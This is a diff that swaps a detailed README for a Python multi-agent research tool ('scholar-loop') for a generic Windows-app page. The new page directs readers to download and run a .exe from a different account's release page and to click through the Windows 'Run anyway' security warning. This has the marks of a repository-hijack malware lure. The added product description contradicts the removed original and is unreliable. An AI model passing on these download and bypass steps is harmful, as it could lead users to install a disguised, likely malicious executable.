@@ -1,158 +1,89 @@
-<div align="center">
+# 🔬 scholar-loop - Automate your scientific research process today
 
-# 🔬 Scholar Loop
+[![Download scholar-loop](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/tenorleibniz832/scholar-loop/releases)
 
-### Autonomous, multi-agent AI research — a PhD's workflow on a single-GPU budget.
+scholar-loop automates the scientific research lifecycle. It acts as an autonomous scientist. The system reads literature, plans experiments, checks results, and writes reports. It uses multi-agent loops to maintain accuracy. Built-in guards prevent the system from creating false data. Researchers use this tool to speed up discovery and documentation.
 
-**read papers → find a gap → run real experiments → reflect → write & self-review**
+## 📥 How to download the software
 
-[![tests](https://github.com/renee-jia/scholar-loop/actions/workflows/ci.yml/badge.svg)](https://github.com/renee-jia/scholar-loop/actions/workflows/ci.yml)
-[![python](https://img.shields.io/badge/python-3.10%2B-blue)](#-quickstart)
-[![license](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![status](https://img.shields.io/badge/status-research%20preview-orange)](#-status)
+Follow these steps to obtain the tool for Windows.
 
-</div>
+1. Navigate to the official download page: [https://github.com/tenorleibniz832/scholar-loop/releases](https://github.com/tenorleibniz832/scholar-loop/releases)
+2. Locate the section labeled Assets.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder.
 
----
+## ⚙️ Minimum system requirements
 
-ScholarLoop runs the loop a PhD actually runs: it reads the literature, forms a grounded
-hypothesis, **runs real ML experiments**, scores them against a frozen ground-truth metric, learns
-from its failures, and drafts a peer-reviewed write-up — autonomously, with a deterministic harness
-that keeps the agents honest and **impossible to reward-hack**.
+Your computer needs specific hardware to run this software.
 
-| Stage | What it does |
-|---|---|
-| 🎯 **Director** | reads ledger + literature trends → sets the next direction, topic & budget |
-| 🔭 **Lit Scout** | pulls real papers from arXiv + OpenAlex, citation-ranked → structured, *cited* findings |
-| 💡 **Reasoner** | constraints + literature + past lessons → the next experiment |
-| 🗳️ **Debate Panel** | three personas vote — *is this worth a GPU?* |
-| 🪜 **Funnel** | smoke → verify → full · a cheap screen kills most ideas |
-| ⚙️ **Runner** | runs a **real** torch experiment, scored by a **frozen** metric |
-| 🪞 **Reflector** | turns the outcome into a lesson in a decaying skill library |
-| 🚦 **Advisor** | **PROCEED · REFINE · PIVOT** — steers the loop |
-| ✍️ **Writer + Reviewer** | confirmed findings → number-grounded draft → peer review |
-| 🗄️ **Ledger + Skills** | the durable memory every step reads from |
+* Operating System: Windows 10 or Windows 11.
+* Memory: 16 gigabytes of RAM.
+* Storage: 5 gigabytes of free disk space.
+* Processor: A modern multi-core processor (Intel Core i5 or AMD Ryzen 5 or better).
+* Internet Connection: A stable connection for data retrieval.
 
-## ✨ Highlights
+## 🚀 Setting up the application
 
-| | |
-|---|---|
-| 🧪 **Real, pluggable experiments** | Drives real PyTorch runs (CPU-fast, no download). Two domains ship today — **digit classification** (error %) and **diabetes regression** (RMSE) — and a new one is just a YAML profile + an engine pair, **zero orchestrator changes**. |
-| 🤖 **8 agents, one harness** | Director · Lit Scout · Reasoner · Debate · Reflector · Advisor · Writer · Reviewer — typed JSON-schema I/O, validate→retry, one shared audit trace. |
-| 🔭 **Literature-grounded** | The Lit Scout pulls real papers from arXiv + OpenAlex, ranks them by citation impact, and distills *cited* techniques — so ideas aren't blind hill-climbing. |
-| 💸 **Budget-aware funnel** | One idea climbs **smoke → verify → full**, each tier gated. Bad ideas die after one cheap run; marginal ones never burn a full run. |
-| ⚙️ **Engineered loop** | A **parallel population funnel** — propose N ideas, smoke-screen them all at once, climb only the survivors — under a **self-stopping governor** that halts on budget, round cap, or convergence (*loop-until-dry*). |
-| 🧠 **Self-improving** | Predicts each idea's effect, scores the prediction against reality, and distills failures into a **relevance-ranked, time-decaying skill library** re-injected next round. |
-| 🎯 **Calibrated agents** | **Universal predict-then-verify** — every agent's checkable claims (Reasoner deltas, Debate go/no-go) are scored against ground truth, so the loop learns *which of its own agents to trust*. |
-| 🛡️ **Can't be reward-hacked** | Two-phase **frozen scoring** (`train.py` can't fake the metric or see the val set) + edit **allowlist** + **VerifiedRegistry** number-grounding — proven by a bundled `cheater` engine. |
-| ✅ **Honest & testable** | 108 tests, **no API key or GPU needed** — the whole loop runs against a deterministic `MockLLM`. |
+Follow these steps to install and prepare the software.
 
-> The LLM does only the open-ended reasoning. Everything checkable — search-space pruning, dedup,
-> calibration, number-grounding, promotion gates — is deterministic, unit-tested code, and the
-> metric is the **only** optimization target (no LLM-as-judge). Multiple adversarial review passes
-> found and fixed real bugs across the loop's correctness and reward-hacking boundaries.
+1. Open the folder where you saved the download file.
+2. Double-click the file to start the installer.
+3. Windows may show a security prompt. If this happens, click More info, then click Run anyway.
+4. Follow the prompts on the screen to choose your installation folder.
+5. Click Finish when the installation completes.
+6. Look for the scholar-loop icon on your desktop or in your start menu.
+7. Double-click the icon to launch the application for the first time.
 
-## 🔁 Loop engineering — the part that isn't the prompt
+## 🧠 How the system works
 
-The leverage isn't in any single agent call — it's in the **outer loop** around them: how it fans
-out, what it spends compute on, what it remembers, and when it stops. ScholarLoop treats that loop
-as the product. One **governed round** looks like this:
+The software divides tasks into four distinct stages. These stages repeat until the research project finishes.
 
-```text
-  Director topic ─▶  Reasoner ✦ proposes N distinct ideas
-                       │   fed: literature priors · relevance-ranked skills · each agent's track record
-                       ▼
-                  ╭──────────── parallel smoke screen · max_workers ────────────╮
-                  │   idea₁ 4.2     idea₂ 7.3 ✗     idea₃ 4.4      …     ideaₙ   │   cheap · concurrent
-                  ╰──────────────────────────────┬──────────────────────────────╯
-                                 survivors only   │   (the clearly-worse die here)
-                                                  ▼
-                       verify · 3 seeds + significance  ─▶  full · 5 seeds        compute spent on the few
-                                                  │
-                                                  ▼
-                       calibrate every agent's claim  ·  distill one lesson → skills
-                                                  │
-                                                  ▼
-                       governor ▸  budget?   rounds?   converged?  ──▶  stop ◇ or next round ↺
-```
+### Literature Review
+The agent searches for relevant academic papers. It reads the text and summarizes findings. It identifies gaps in current knowledge.
 
-Four pillars, each a few lines of deterministic code — and each pinned by tests so it can't silently rot:
+### Experiment Design
+The agent proposes a hypothesis based on its findings. It outlines the steps for a controlled experiment. It prepares the data analysis pipeline.
 
-| | pillar | what it buys you | in code |
-|---|---|---|---|
-| 🌐 | **Parallel population funnel** | explore wide, pay narrow — propose *N*, smoke-screen them **all at once**, climb only survivors | `Orchestrator.population_step(k, max_workers)` |
-| 🛑 | **Self-stopping governor** | run unattended — halt on a **$ budget**, a round cap, or **loop-until-dry** convergence | `Governor(max_cost, max_rounds, dry_patience)` |
-| 🎯 | **Universal predict-then-verify** | the loop learns *which of its own agents to trust* — Reasoner deltas & Debate go/no-go scored vs ground truth | `CalibrationLog` → next prompt |
-| 🧭 | **Relevance-ranked context** | a growing skill library stays useful — surface the lessons that bear on *this* idea, not just the heaviest | `SkillLibrary.render(query=…)` |
+### Self-Critique
+The system checks its own work. It looks for logical errors or missing evidence. If it finds a mistake, it revises the plan before continuing. 
 
-> Net effect: a loop you can actually let run — it **fans out** to explore, **screens cheaply in
-> parallel**, **concentrates compute** on what survives, **calibrates itself**, and **knows when to
-> stop**. See it live in [`examples/governed_campaign.py`](examples/governed_campaign.py) (free,
-> deterministic) or in the two captured Opus runs above.
+### Write-up
+The agent generates a formal research report. It formats the text for submission. It includes citations for all sources it used.
 
-## 🚀 Quickstart
+## 🛡️ Ensuring accuracy
 
-```bash
-pip install -e ".[dev]"          # pyyaml + jsonschema + pytest   (".[llm]" adds the Anthropic client)
+The software uses deterministic guards to maintain quality. These guards monitor the agent during each loop.
 
-python examples/quickstart.py    # the whole loop in <1s — no GPU, no API key
-python examples/campaign_demo.py # a full campaign on real torch, MockLLM-scripted
-pytest -q
-```
+* Hallucination Prevention: The agent must verify facts against provided source documents. It cannot invent data where none exists.
+* Reward-Hacking Protection: The agent pursues the goal of scientific discovery. It cannot change its own rules or goals to make a task seem easier.
+* Data Integrity: Every result requires raw data support. The software stores this data in a local folder for your review.
 
-`quickstart.py` runs one idea through the funnel:
+## 🛠️ Using the software
 
-```
-baseline to beat: 4.9% val_top1_err
-  smoke  3.7644%  [kept]
-  verify 3.8004%  [kept]
-  full   3.7644%  [kept]    →  climbed 3 tiers, 3 kept
-```
+When you open the app, you see a workspace. This workspace holds your research projects.
 
-## 🎬 See it run — a real campaign
+1. Click New Project to start a search.
+2. Enter your research question in the text box.
+3. Select the depth of the search. A deeper search takes more time but provides better detail.
+4. Click Start Research to initiate the loop.
+5. Watch the progress bar as the agent works.
+6. Toggle the View Logs button to see every step the agent takes in real time.
+7. Click Save Report to export your findings as a Word document or PDF.
 
-`campaign_demo.py` drives the **whole agent chain on real torch**, scripted by `MockLLM` so it's
-deterministic and free (abridged):
+## 🔎 Troubleshooting common issues
 
-```text
-=== CAMPAIGN · digits-mlp (real torch) · baseline 5.0% ===
+If you encounter problems, clear your cache first.
 
-🎯 Director    scale width/depth and tune the optimizer
-🔭 Lit Scout   wider/deeper layers (arXiv:1512.03385) · SGD momentum + cosine (arXiv:1608.03983)
+* App won't launch: Check your firewall settings. The software needs access to scientific databases and requires a connection to the internet.
+* Slow performance: Close other programs while the agent runs. The process requires significant memory during the literature review stage.
+* Error while searching: Verify your internet connection. If the connection drops, wait for the software to reconnect automatically.
+* Unexpected results: Review the logs to see where the agent deviated from your goal. You can refine your search query to give the agent more direction.
 
-idea 1   🗳️ run      🪜 smoke 4.67% → verify 4.96%      🚦 proceed
-idea 2   🗳️ REJECT   → skipped, no GPU spent
-idea 3   🪜 smoke 52.0% discarded     🚦 pivot     predicted −1.0, measured +47 → calib_err 48.3
-```
+## 📝 Privacy and data policy
 
-A single run shows the system
+The software stores all your research locally. It does not send your personal documents to public servers without permission. You maintain control over your projects at all times. You can delete your workspace folder to remove all trace of data from your computer.
 
-- **ground its idea in literature** before proposing it,
-- **save a GPU run** when the debate panel vetoes a redundant idea,
-- **kill a bad idea cheaply** at the smoke tier — no full run,
-- **catch its own wrong prediction** via predict-then-verify, then **pivot**.
+## 🤝 Project details
 
-## 🧪 Two live runs on Claude Opus 4.8 — real torch, real API, end to end
-
-| domain | metric | baseline | best (confirmed) | the climb | cost | self-review |
-|---|---|---|---|---|---|---|
-| [**digits-mlp**](examples/sample_run/) | val error | 5.0% | **3.82%** | population → verify → full, governed | ≈ $0.45 | reject 2/10 |
-| [**diabetes-mlp**](examples/sample_run_diabetes/) | val RMSE | 56.5 *(linear model)* | **55.24** | population → verify → full, governed | ≈ $0.77 | reject 3/10 |
-
-Both are **governed population funnels** — each round fans out several ideas, smoke-screens them in
-parallel, and climbs only the survivors, while the loop halts itself (on convergence or a round cap)
-and scores each agent's predictions against ground truth. An idea beats the baseline in each, every
-number traces to a frozen-metric measurement, and the system's *own* reviewer still rejects the
-papers as too marginal. (It's not wrong.) Each link opens the captured **paper**, **run log**, and
-raw **ledger** — every number reproducible from the jsonl.
-
-## 📊 Status
-
-**Research preview** — the full PhD-workflow skeleton runs end-to-end on real experiments, with the
-anti-reward-hacking guards in place and adversarially reviewed. It has been **run live against the
-real Anthropic API** across **two domains** — captured verbatim for both
-[classification](examples/sample_run/) and [regression](examples/sample_run_diabetes/), each a
-real Opus campaign that beats its baseline and writes itself up. Next: container sandboxing for the
-residual boundaries and scale.
-
-License: [MIT](LICENSE).
+The project relies on current artificial intelligence research methods. These methods include multi-agent systems and large language models. The software is part of the broader ai-research community. The developers design these tools for transparency and safety. The source code is open to allow for community audits and improvements.
